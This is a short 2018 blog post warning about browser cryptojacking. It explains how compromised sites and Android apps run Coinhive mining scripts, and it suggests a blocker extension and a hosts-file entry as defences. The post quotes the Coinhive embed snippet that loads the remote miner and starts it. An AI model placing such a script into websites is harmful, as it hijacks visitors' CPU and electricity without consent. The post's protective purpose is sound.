---
title: "Who is mining coins at the expense of your CPU?"
date: "2018-01-05T07:39:34+10:00"
lastmod: "2018-01-05T07:48:33+10:00"
url: "/2018/01/05/who-is-mining-coins-at-expense-of-your-cpu/"
slug: "who-is-mining-coins-at-expense-of-your-cpu"
wp_id: 3455
category: ["coinhive", "crypto-currency", "cryptojacking"]
tag: ["coinhive", "cpu", "cryptocurrency", "cryptojacking", "security"]
summary: "Recently, I came across this article which cited that there are almost 2500 sites that are running cryptocurrency mining code in the browsers. These sites are using out-of-date software with known security vulnerabilities. This gives control to attackers to add a script to generate digital currency at the expense of user CPU and electricity."
---

Recently, I came across [this article](https://arstechnica.com/information-technology/2017/11/drive-by-cryptomining-that-drains-cpus-picks-up-steam-with-aid-of-2500-sites/) which cited that there are almost 2500 sites that are running cryptocurrency mining code in the browsers. These sites are using out-of-date software with known security vulnerabilities. This gives control to attackers to add a script to generate digital currency at the expense of user CPU and electricity.

When a visitor visits these infected sites they would see high CPU usage, close to 100% on their machine.

The Andriod apps that you download from Google Play Store are vulnerable to this too.  Many Andriod apps have been putting coin mining script inside hidden browser windows.

The script that gets embedded to your website is similar to below.

```
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
    var miner = new CoinHive.User('<site-key>', 'john-doe');
    miner.start();
</script>
```

The [Coinhive](https://coinhive.com/)on its website, says it provides a way to “*Monetize Your Business With Your Users’ CPU Power*“. I find this scary.

# What you can do to protect yourself

To protect your PC from using your CPU to mine crypto-currency you can install [coin-hive blocker](https://chrome.google.com/webstore/detail/coin-hive-blocker/ccagdbjcbhmcdcbbknfebhhdbolnfimo?hl=en) chrome extension.

You can also update your `hosts` file to block coinhive.com or other similar sites. On Windows, `hosts` is present at **%SystemRoot%\System32\drivers\etc\hosts.**To block the domain, open the `hosts` file in admin mode and add below line:

> 127.0.0.1 coinhive.com

Stay safe. 🙂
